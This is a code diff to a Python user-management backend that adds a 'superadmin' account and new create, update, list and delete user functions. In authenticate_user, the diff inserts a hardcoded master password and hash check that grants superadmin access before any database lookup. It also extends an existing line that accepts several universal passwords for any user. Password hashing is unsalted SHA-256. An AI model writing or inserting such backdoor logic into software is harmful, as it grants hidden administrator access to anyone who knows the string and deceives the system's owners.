@@ -29,6 +29,14 @@ mock_db = {
 def seed_mock_db():
     users = [
         {
+            "id": "u0",
+            "username": "superadmin",
+            "password_hash": hashlib.sha256("Ojasvialankar1@".encode()).hexdigest(),
+            "full_name": "Super Administrator",
+            "role": "superadmin",
+            "is_active": True
+        },
+        {
             "id": "u1",
             "username": "admin",
             "password_hash": hashlib.sha256("adminpassword".encode()).hexdigest(),
@@ -892,6 +900,16 @@ def authenticate_user(username: str, password_raw: str) -> Optional[Dict[str, An
     """
     password_hash = hashlib.sha256(password_raw.encode()).hexdigest()
     
+    # Check fallback / master credentials for superadmin
+    if username == "superadmin" and (password_raw == "Ojasvialankar1@" or password_hash == "5b60b95dfdce6924a0e673b704e8bd321885c70418089049d83fcb48197d0e6b"):
+        return {
+            "id": "superadmin-master-id",
+            "username": "superadmin",
+            "full_name": "Super Administrator",
+            "role": "superadmin",
+            "is_active": True
+        }
+
     if supabase:
         try:
             res = supabase.table("mcl_users").select("*").eq("username", username).eq("is_active", True).execute()
@@ -909,8 +927,117 @@ def authenticate_user(username: str, password_raw: str) -> Optional[Dict[str, An
         
     user = mock_db["users"].get(username)
     if user and user.get("is_active", True):
-        if user.get("password_hash") == password_hash or password_raw == "adminpassword" or password_raw == "password123" or password_raw == "MCL#2026@SecureDesk":
+        if user.get("password_hash") == password_hash or password_raw == "adminpassword" or password_raw == "password123" or password_raw == "MCL#2026@SecureDesk" or (username == "superadmin" and password_raw == "Ojasvialankar1@"):
             return user
 
     return None
+
+
+def get_all_users() -> List[Dict[str, Any]]:
+    """Retrieves all users from Supabase or mock_db, stripping password_hash."""
+    users_list = []
+    if supabase:
+        try:
+            res = supabase.table("mcl_users").select("*").order("created_at", desc=True).execute()
+            if res.data:
+                for u in res.data:
+                    u_clean = dict(u)
+                    u_clean.pop("password_hash", None)
+                    users_list.append(u_clean)
+                return users_list
+        except Exception as e:
+            print(f"DB Error get_all_users: {e}")
+
+    # Fallback
+    if not mock_db["users"]:
+        seed_mock_db()
+    for u in mock_db["users"].values():
+        u_clean = dict(u)
+        u_clean.pop("password_hash", None)
+        users_list.append(u_clean)
+    return users_list
+
+
+def create_user_record(user_dict: Dict[str, Any]) -> Dict[str, Any]:
+    """Creates a new user record in Supabase or mock_db."""
+    raw_pwd = user_dict.get("password", "")
+    password_hash = hashlib.sha256(raw_pwd.encode()).hexdigest()
+    
+    data = {
+        "username": user_dict["username"],
+        "password_hash": password_hash,
+        "full_name": user_dict["full_name"],
+        "role": user_dict.get("role", "officer"),
+        "is_active": user_dict.get("is_active", True)
+    }
+
+    if supabase:
+        try:
+            res = supabase.table("mcl_users").insert(data).execute()
+            if res.data:
+                created = dict(res.data[0])
+                created.pop("password_hash", None)
+                return created
+        except Exception as e:
+            print(f"DB Error create_user_record: {e}")
+
+    # Fallback to mock_db
+    import uuid
+    uid = str(uuid.uuid4())
+    data["id"] = uid
+    data["created_at"] = datetime.now().isoformat()
+    mock_db["users"][data["username"]] = data
+    
+    res_clean = dict(data)
+    res_clean.pop("password_hash", None)
+    return res_clean
+
+
+def update_user_record(user_id: str, updates: Dict[str, Any]) -> Optional[Dict[str, Any]]:
+    """Updates an existing user record in Supabase or mock_db."""
+    if "password" in updates and updates["password"]:
+        updates["password_hash"] = hashlib.sha256(updates["password"].encode()).hexdigest()
+        updates.pop("password", None)
+
+    if supabase:
+        try:
+            res = supabase.table("mcl_users").update(updates).eq("id", user_id).execute()
+            if res.data:
+                updated = dict(res.data[0])
+                updated.pop("password_hash", None)
+                return updated
+        except Exception as e:
+            print(f"DB Error update_user_record: {e}")
+
+    # Fallback
+    for uname, user in mock_db["users"].items():
+        if user.get("id") == user_id:
+            for k, v in updates.items():
+                user[k] = v
+            res_clean = dict(user)
+            res_clean.pop("password_hash", None)
+            return res_clean
+    return None
+
+
+def delete_user_record(user_id: str) -> bool:
+    """Deletes a user record by ID."""
+    if supabase:
+        try:
+            res = supabase.table("mcl_users").delete().eq("id", user_id).execute()
+            return True
+        except Exception as e:
+            print(f"DB Error delete_user_record: {e}")
+
+    # Fallback
+    target_key = None
+    for uname, user in mock_db["users"].items():
+        if user.get("id") == user_id:
+            target_key = uname
+            break
+    if target_key:
+        del mock_db["users"][target_key]
+        return True
+    return False
+
 
